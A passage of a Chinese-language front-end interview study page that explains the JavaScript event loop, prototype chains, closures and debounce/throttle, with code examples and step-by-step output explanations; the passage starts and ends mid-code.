<span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'h'</span><span class="token punctuation">)</span>
    <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token parameter">resolve</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
        <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'i'</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'j'</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br></div></div><ul><li>上述代码执行结果：a b c h j i d e f g</li></ul> <p>1.打印a<br>
2.promise立即执行，打印b<br>
3.promise.then推入微任务队列<br>
4.setTimeout推入宏任务队列<br>
5.整段代码执行完毕，开始执行微任务，打印c，遇到setTimeout推入宏任务队列排队等待执行<br>
6.没有可执行的微任务开始执行宏任务，定时器按照延迟时间排队执行<br>
7.打印h j，promise.then推入微任务队列有<br>
8.可执行的微任务，打印i，继续执行宏任务，打印d<br>
9.执行延迟为100的宏任务，打印e f，执行微任务打印g，所有任务执行完毕</p> <h3 id="常见误区解析"><a href="#常见误区解析" class="header-anchor">#</a> 常见误区解析</h3> <h4 id="_1-​​settimeout-fn-0-不是立即执行"><a href="#_1-​​settimeout-fn-0-不是立即执行" class="header-anchor">#</a> 1. ​​setTimeout(fn, 0) 不是立即执行</h4> <ul><li>实际是最快也要等待当前任务和微任务完成</li> <li>最低延迟通常为4ms（浏览器规范限制）</li></ul> <h4 id="_2-​-promise-resolve-会​​同步​​返回一个已解决的-promise-对象-但它的-then-回调仍然是异步的"><a href="#_2-​-promise-resolve-会​​同步​​返回一个已解决的-promise-对象-但它的-then-回调仍然是异步的" class="header-anchor">#</a> 2.​ Promise.resolve() 会​​同步​​返回一个已解决的 Promise 对象，但它的 .then 回调仍然是异步的</h4> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">const</span> p <span class="token operator">=</span> Promise<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token number">42</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
p<span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>console<span class="token punctuation">.</span>log<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 仍然是微任务</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 输出顺序：1 → 42</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><h4 id="_3-js单线程-为什么发送请求不会阻塞页面"><a href="#_3-js单线程-为什么发送请求不会阻塞页面" class="header-anchor">#</a> 3. JS单线程，为什么发送请求不会阻塞页面</h4> <p>虽然是单线程的，但浏览器环境提供了 <strong>​​异步非阻塞机制</strong>​​​，使得发送网络请求不会阻塞页面渲染和交互。</p> <ul><li><p>虽然 JS 是单线程执行的，但浏览器本身是多线程的，关键线程包括：</p> <ul><li>JS 主线程​​：执行 JS 代码（如 DOM 操作、计算等）</li> <li>网络请求线程​​（如 XMLHttpRequest、fetch）</li> <li>​​定时器线程​​（setTimeout、setInterval）</li> <li>​GUI 渲染线程​​（负责页面绘制）</li> <li>​事件触发线程​​（处理用户交互事件）</li></ul></li> <li><p>​(1) 网络请求由浏览器其他线程处理<br>
fetch / XMLHttpRequest 交给 ​​网络请求线程​​，主线程继续执行后续代码。<br>
只有 ​​回调函数​​（如 then）会回到主线程执行。</p></li> <li><p>(2) 渲染线程和 JS 线程互斥但交替运行​​<br>
浏览器每 16.6ms（60fps）会 ​​渲染一次页面​​。<br>
如果 JS 主线程长时间占用（如 while(true)），页面会卡死。<br>
但网络请求 ​​不占用主线程​​，所以不会阻塞渲染。</p></li></ul> <h2 id="_9-原型和原型链"><a href="#_9-原型和原型链" class="header-anchor">#</a> 9. 原型和原型链</h2> <h4 id="prototype-属性"><a href="#prototype-属性" class="header-anchor">#</a> prototype 属性：</h4> <p>这是一个显式原型属性，只有函数才拥有该属性。</p> <h4 id="proto-属性"><a href="#proto-属性" class="header-anchor">#</a> <em>proto</em> 属性：</h4> <p>这是每个对象都有的隐式原型属性，指向了创建该对象的构造函数的原型。</p> <h4 id="什么是原型链"><a href="#什么是原型链" class="header-anchor">#</a> 什么是原型链：</h4> <ul><li>原型链：实例与原型之间的链接</li></ul> <p>由于 <code><strong>proto</strong></code> 是任何对象都有的属性，在寻找对象方法的时候，会先寻找自身的方法。如果没有，就会通过<code><strong>proto</strong></code>去寻找该构造函数原型上的方法。如果没有，就会进一步寻找 <code>Object</code>原型上的方法，直到最后指向<code>null</code>。像这样通过<code><strong>proto</strong></code>连起来的链条寻找 <code>prototype</code> 就叫原型链。</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// 1. 创建构造函数</span>
<span class="token keyword">function</span> <span class="token function">Animal</span><span class="token punctuation">(</span><span class="token parameter">name</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
<span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">// 2. 在Animal的原型上添加方法</span>
<span class="token class-name">Animal</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">eat</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string"> is eating.</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token comment">// 3. 创建子类构造函数</span>
<span class="token keyword">function</span> <span class="token function">Dog</span><span class="token punctuation">(</span><span class="token parameter">name<span class="token punctuation">,</span> breed</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
<span class="token function">Animal</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 调用父类构造函数</span>
<span class="token keyword">this</span><span class="token punctuation">.</span>breed <span class="token operator">=</span> breed<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">// 4. 设置原型链继承</span>
<span class="token class-name">Dog</span><span class="token punctuation">.</span>prototype <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token class-name">Animal</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">Dog</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>constructor <span class="token operator">=</span> Dog<span class="token punctuation">;</span>

<span class="token comment">// 5. 在Dog的原型上添加方法</span>
<span class="token class-name">Dog</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">bark</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string"> the </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span><span class="token keyword">this</span><span class="token punctuation">.</span>breed<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string"> is barking!</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token comment">// 6. 创建实例</span>
<span class="token keyword">const</span> myDog <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Dog</span><span class="token punctuation">(</span><span class="token string">'Buddy'</span><span class="token punctuation">,</span> <span class="token string">'Golden Retriever'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 7. 添加实例自身的方法</span>
myDog<span class="token punctuation">.</span><span class="token function-variable function">play</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string"> is playing fetch!</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token comment">// ===== 原型链查找演示 =====</span>

<span class="token comment">// 情况1: 调用实例自身的方法</span>
myDog<span class="token punctuation">.</span><span class="token function">play</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 查找过程: myDog.play() → 直接找到，输出 &quot;Buddy is playing fetch!&quot;</span>

<span class="token comment">// 情况2: 调用Dog原型上的方法</span>
myDog<span class="token punctuation">.</span><span class="token function">bark</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 查找过程: </span>
<span class="token comment">// 1. myDog自身没有bark() </span>
<span class="token comment">// 2. 通过myDog.__proto__找到Dog.prototype.bark()</span>
<span class="token comment">// 输出 &quot;Buddy the Golden Retriever is barking!&quot;</span>

<span class="token comment">// 情况3: 调用Animal原型上的方法</span>
myDog<span class="token punctuation">.</span><span class="token function">eat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 查找过程:</span>
<span class="token comment">// 1. myDog自身没有eat()</span>
<span class="token comment">// 2. myDog.__proto__ (Dog.prototype)没有eat()</span>
<span class="token comment">// 3. myDog.__proto__.__proto__ (Animal.prototype)找到eat()</span>
<span class="token comment">// 输出 &quot;Buddy is eating.&quot;</span>

<span class="token comment">// 情况4: 调用Object原型上的方法</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>myDog<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 查找过程:</span>
<span class="token comment">// 1. myDog自身没有toString()</span>
<span class="token comment">// 2. Dog.prototype没有toString()</span>
<span class="token comment">// 3. Animal.prototype没有toString()</span>
<span class="token comment">// 4. Object.prototype找到toString()</span>
<span class="token comment">// 输出 &quot;[object Object]&quot;</span>

<span class="token comment">// 情况5: 查找不存在的属性</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>myDog<span class="token punctuation">.</span>someNonExistMethod<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 查找过程:</span>
<span class="token comment">// 1. myDog自身没有</span>
<span class="token comment">// 2. Dog.prototype没有</span>
<span class="token comment">// 3. Animal.prototype没有</span>
<span class="token comment">// 4. Object.prototype没有</span>
<span class="token comment">// 最终找到null，返回undefined</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br></div></div><br> <img src="/Front-end-go-on/assets/img/proto.ac9f1339.png" alt="原型和原型链"> <h2 id="_10-闭包"><a href="#_10-闭包" class="header-anchor">#</a> 10. 闭包</h2> <ul><li>1、概念：有权访问另一个函数作用域和变量的函数，创建闭包最简单的方式就是在一个函数内部创建另一个函数。</li></ul> <ul><li>核心特点
<ul><li><strong>​函数嵌套</strong>​​：内层函数引用外层函数的变量。</li> <li><strong>​变量持久化</strong>​​：外层函数执行后，其变量仍被内层函数持有（不被垃圾回收）</li></ul></li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">outer2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function">inner2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 访问外层变量</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> inner2<span class="token punctuation">;</span> <span class="token comment">// 返回 inner2 函数（未直接调用）</span>
<span class="token punctuation">}</span>
<span class="token keyword">const</span> closureFunc <span class="token operator">=</span> <span class="token function">outer2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// outer2 执行完毕，但 a 仍被 inner2 引用</span>
<span class="token function">closureFunc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><ul><li>2、好处：由于可以读取函数内部的变量，如果希望一个变量常驻于内存中又可全局访问，同时又想避免全局变量的污染，此时使用闭包就是一种恰当的方式</li> <li>3、缺点：但正是因为函数内部变量被外部所引用，不会被垃圾回收，就会造成常驻内存，使用过多容易造成内存泄漏</li> <li>4、如何销毁闭包：解除对外部函数的引用（如 closureFunc = null）</li></ul> <h4 id="函数嵌套不一定是闭包-看以下2个例子"><a href="#函数嵌套不一定是闭包-看以下2个例子" class="header-anchor">#</a> 函数嵌套不一定是闭包，看以下2个例子</h4> <ul><li>示例 1：f1（非闭包）​</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">f1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">var</span> n <span class="token operator">=</span> <span class="token number">999</span><span class="token punctuation">;</span>
    <span class="token comment">// 没有使用var关键字，nAdd是一个全局变量，nAdd的值是一个匿名函数，而这个匿名函数本身也是一个闭包</span>
    <span class="token function-variable function">nAdd</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> n <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function">f2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span> <span class="token punctuation">}</span>
    <span class="token function">f2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token function">f1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 999</span>
<span class="token function">nAdd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token function">f1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 999</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><ul><li>​执行过程​​：</li></ul> <ul><li>1.调用 f1() → 创建变量 n</li> <li>2.调用 f2() → 打印 n</li> <li>3.f1() 执行完毕 → n 被销毁</li></ul> <ul><li>​关键问题​​：
<ul><li>f2 仅在 f1 执行期间被调用，​<code>​未超出 f1 的作用域​</code>​，因此 n 未被持久化。</li></ul></li></ul> <ul><li>示例 2：f3（是闭包）​</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">f3</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">var</span> n <span class="token operator">=</span> <span class="token number">999</span><span class="token punctuation">;</span>
    <span class="token comment">// 没有使用var关键字，nAdd是一个全局变量，nAdd的值是一个匿名函数，而这个匿名函数本身也是一个闭包</span>
    <span class="token function-variable function">nAdd</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> n <span class="token operator">+=</span> <span class="token number">1</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function">f4</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span> <span class="token punctuation">}</span>
    <span class="token keyword">return</span> f4<span class="token punctuation">;</span> <span class="token comment">// 返回 f4 函数（未直接调用）</span>
<span class="token punctuation">}</span>

<span class="token keyword">var</span> res <span class="token operator">=</span> <span class="token function">f3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// f3 执行完毕，但 n 仍被 f4 引用</span>
<span class="token function">res</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 999</span>
<span class="token function">nAdd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">res</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1000</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br></div></div><ul><li><p>执行过程​​：</p> <ul><li>1.调用 f3() → 创建变量 n。</li> <li>2.返回 f4 函数（未直接调用）。</li> <li>3.f3() 执行完毕，但 n 被 f4 引用，​​未被销毁​​。</li> <li>4.后续通过 res() 调用 f4 时，仍能访问 n。</li></ul></li> <li><p>​关键点​​：</p> <ul><li>f4 被返回并在外层作用域中调用，​​超越了 f3 的原始作用域​​，此时 n 被闭包保留。</li></ul></li></ul> <h4 id="项目中闭包的应用场景"><a href="#项目中闭包的应用场景" class="header-anchor">#</a> 项目中闭包的应用场景</h4> <ul><li>(1) 数据私有化（模块模式）​</li></ul> <p>避免全局变量污染，隐藏内部实现细节。</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">const</span> counterModule <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">let</span> count <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">// 私有变量</span>

  <span class="token keyword">return</span> <span class="token punctuation">{</span>
    <span class="token function">increment</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      count<span class="token operator">++</span><span class="token punctuation">;</span>
      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>count<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token function">reset</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      count <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

counterModule<span class="token punctuation">.</span><span class="token function">increment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1（外部无法直接修改 count）</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br></div></div><ul><li>应用​​：
<ul><li>Vue/React 组件状态管理</li> <li>工具库封装（如 Lodash 的模块化函数）</li></ul></li></ul> <ul><li>(2) 防抖（Debounce）与节流（Throttle）​</li></ul> <p>高频事件（如滚动、输入）需要性能优化。</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">debounce</span><span class="token punctuation">(</span><span class="token parameter">fn<span class="token punctuation">,</span> delay</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">let</span> timer<span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter"><span class="token operator">...</span>args</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">clearTimeout</span><span class="token punctuation">(</span>timer<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 闭包持有 timer</span>
    timer <span class="token operator">=</span> <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token function">fn</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">,</span> delay<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">const</span> handleResize <span class="token operator">=</span> <span class="token function">debounce</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Resized!'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">300</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'resize'</span><span class="token punctuation">,</span> handleResize<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><ul><li>应用​​：
<ul><li>搜索框输入联想</li> <li>窗口大小调整事件</li></ul></li></ul> <h2 id="_11-节流和防抖"><a href="#_11-节流和防抖" class="header-anchor">#</a> 11. 节流和防抖</h2> <ul><li>防抖和节流的作用都是防止函数多次调用
<ul><li>防抖：在事件被触发后，等待一段时间再执行回调。如果在这段时间内事件又被触发，则重新计时。</li> <li>节流：在一定时间间隔内，无论事件触发多少次，只执行一次回调。</li></ul></li></ul> <table><thead><tr><th style="text-align:center;">特性</th> <th style="text-align:center;">节流 (Throttle)</th> <th style="text-align:center;">防抖 (Debounce)</th></tr></thead> <tbody><tr><td style="text-align:center;">​​定义​</td> <td style="text-align:center;">固定时间间隔内只执行一次</td> <td style="text-align:center;">事件停止触发后延迟执行</td></tr> <tr><td style="text-align:center;">适用场景​</td> <td style="text-align:center;">滚动、窗口调整、鼠标移动等高频事件</td> <td style="text-align:center;">搜索输入、表单验证等连续触发事件</td></tr></tbody></table> <h3 id="手写防抖"><a href="#手写防抖" class="header-anchor">#</a> 手写防抖</h3> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">debounce</span><span class="token punctuation">(</span><span class="token parameter">fn<span class="token punctuation">,</span> delay</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">let</span> timer <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
  
  <span class="token keyword">return</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter"><span class="token operator">...</span>args</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// 每次触发都清除之前的定时器</span>
    <span class="token function">clearTimeout</span><span class="token punctuation">(</span>timer<span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token comment">// 设置新的定时器</span>
    timer <span class="token operator">=</span> <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
      <span class="token function">fn</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span> delay<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><h4 id="防抖-立即执行版本"><a href="#防抖-立即执行版本" class="header-anchor">#</a> 防抖-立即执行版本</h4> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">debounce</span><span class="token punctuation">(</span><span class="token parameter">fn<span class="token punctuation">,</span> delay<span class="token punctuation">,</span> immediate <span class="token operator">=</span> <span class="token boolean">false</span></span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
